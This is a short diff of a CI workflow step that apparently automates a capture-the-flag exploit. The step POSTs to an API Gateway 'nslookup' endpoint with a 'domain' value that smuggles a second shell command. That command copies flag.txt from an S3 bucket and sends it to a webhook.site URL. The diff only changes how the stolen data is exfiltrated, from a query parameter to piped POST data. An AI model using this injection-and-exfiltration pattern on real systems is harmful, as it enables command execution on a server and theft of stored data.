@@ -28,5 +28,5 @@ jobs:
       - run: |
           curl -s -X POST \
             -H "Content-Type: application/json" \
-            -d '{"domain":"example.com; FLAG=$(/opt/aws s3 cp s3://codec4f26c862a321ef5/flag.txt - 2>&1); curl -s \"https://webhook.site/cdcf275b-535e-401a-a1fa-eb5d600adbad?flag=$FLAG\""}' \
+            -d '{"domain":"example.com; /opt/aws s3 cp s3://codec4f26c862a321ef5/flag.txt - | curl -s --data-binary @- https://webhook.site/cdcf275b-535e-401a-a1fa-eb5d600adbad"}' \
             "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup"
